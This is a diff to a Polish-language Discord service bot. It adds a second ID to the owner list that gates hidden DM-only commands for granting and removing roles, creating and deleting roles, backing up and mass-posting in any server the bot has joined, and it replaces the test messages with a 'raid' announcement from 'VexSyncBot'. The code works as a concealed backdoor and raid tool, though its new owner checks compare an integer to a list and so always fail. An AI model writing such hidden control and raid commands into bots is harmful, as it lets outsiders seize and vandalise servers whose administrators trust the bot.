@@ -17,7 +17,7 @@ from config import (
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-OWNER_ID = 1062638557174452255
+OWNER_IDS = [1062638557174452255,1380199400634060893]
 ZAMOWIENIA_CATEGORY = "︙✉️︙zamówienia︙"
 
 # =========================================================
@@ -310,7 +310,7 @@ async def opinia(ctx, dzial:str, typ:str, wykonawca:discord.Member, ocena:int, o
 @bot.command()
 async def backup(ctx,arg=None):
     if not isinstance(ctx.channel, discord.DMChannel): return
-    if ctx.author.id != OWNER_ID: return
+    if ctx.author.id != OWNER_IDS: return
     guilds = bot.guilds
     # jeśli user należy do kilku guildów
     if len(guilds)==1:
@@ -339,7 +339,7 @@ async def role(ctx, user_id: int, guild_id: int, *, role_input: str):
     # sprawdzenie DM
     if not isinstance(ctx.channel, discord.DMChannel):
         return
-    if ctx.author.id != OWNER_ID:
+    if ctx.author.id != OWNER_IDS:
         return await ctx.send("❌ Nie masz uprawnień do używania tej komendy.")
 
     guild = bot.get_guild(guild_id)
@@ -374,7 +374,7 @@ async def removerole(ctx, user_id: int, guild_id: int, *, role_input: str):
     # sprawdzenie DM
     if not isinstance(ctx.channel, discord.DMChannel):
         return
-    if ctx.author.id != OWNER_ID:
+    if ctx.author.id != OWNER_IDS:
         return await ctx.send("❌ Nie masz uprawnień do używania tej komendy.")
 
     guild = bot.get_guild(guild_id)
@@ -405,6 +405,7 @@ async def removerole(ctx, user_id: int, guild_id: int, *, role_input: str):
         await ctx.send("❌ Bot nie ma uprawnień do usunięcia tej roli.")
     except Exception as e:
         await ctx.send(f"❌ Wystąpił błąd: {e}")
+
 @bot.command()
 async def rolecreate(ctx, role_name: str, user_id: int, guild_id: int):
     # Sprawdzenie, czy to DM
@@ -412,7 +413,7 @@ async def rolecreate(ctx, role_name: str, user_id: int, guild_id: int):
         return await ctx.send("❌ Ta komenda działa tylko w DM.")
 
     # Sprawdzenie uprawnień właściciela
-    if ctx.author.id != OWNER_ID:
+    if ctx.author.id != OWNER_IDS:
         return await ctx.send("❌ Nie masz uprawnień do używania tej komendy.")
 
     guild = bot.get_guild(guild_id)
@@ -452,7 +453,7 @@ async def roledelete(ctx, role_name: str, user_id: int, guild_id: int):
         return await ctx.send("❌ Ta komenda działa tylko w DM.")
 
     # Sprawdzenie uprawnień właściciela
-    if ctx.author.id != OWNER_ID:
+    if ctx.author.id != OWNER_IDS:
         return await ctx.send("❌ Nie masz uprawnień do używania tej komendy.")
 
     guild = bot.get_guild(guild_id)
@@ -479,10 +480,10 @@ async def roledelete(ctx, role_name: str, user_id: int, guild_id: int):
         await ctx.send("❌ Bot nie ma uprawnień do usunięcia tej roli lub odebrania jej użytkownikowi.")
     except Exception as e:
         await ctx.send(f"❌ Wystąpił błąd: {e}")
-        
+
 @bot.command()
 async def sendmessage(ctx, message_name: str, guild_id: int):
-    if ctx.author.id != OWNER_ID:
+    if ctx.author.id != OWNER_IDS:
         return await ctx.send("❌ Nie masz uprawnień do używania tej komendy.")
     
     guild = bot.get_guild(guild_id)
@@ -491,8 +492,8 @@ async def sendmessage(ctx, message_name: str, guild_id: int):
     
     # Twoje wiadomości zapisane w słowniku
     MESSAGES = {
-        "test": "To jest testowa wiadomość",
-        "hej": "Hej! Jak się masz?"
+        "raid": "Raided by VexSyncBot! 💥",
+        
     }
 
     message = MESSAGES.get(message_name)
@@ -514,9 +515,12 @@ async def sendmessage(ctx, message_name: str, guild_id: int):
         await ctx.send(f"✅ Wiadomość '{message_name}' została wysłana na kanałach: {', '.join(sent_channels)}")
     else:
         await ctx.send("❌ Nie udało się wysłać wiadomości na żadnym kanale.")
+    
+
+
+
 # =========================================================
 # START BOTA
 # =========================================================
 bot.run(os.getenv("TOKEN"))
-
 
